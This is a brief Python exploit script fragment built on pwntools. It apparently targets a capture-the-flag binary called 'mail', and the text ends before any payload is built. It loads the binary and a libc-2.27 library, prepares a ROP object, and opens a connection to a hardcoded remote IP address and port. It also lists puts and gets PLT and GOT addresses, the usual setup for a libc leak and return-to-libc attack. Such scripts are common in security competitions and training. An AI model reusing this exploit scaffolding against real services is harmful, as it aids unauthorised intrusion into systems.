from pwn import *

e = ELF('./mail')
rop = ROP(e)

r = remote('122.38.251.9', 57575)
libc = ELF('./libc-2.27.so')

PUTS_PLT = 0x400EA0
PUTS_GOT = 0x4120C0
GETS_PLT = 0x400E80
GETS_GOT = 0x4120C8

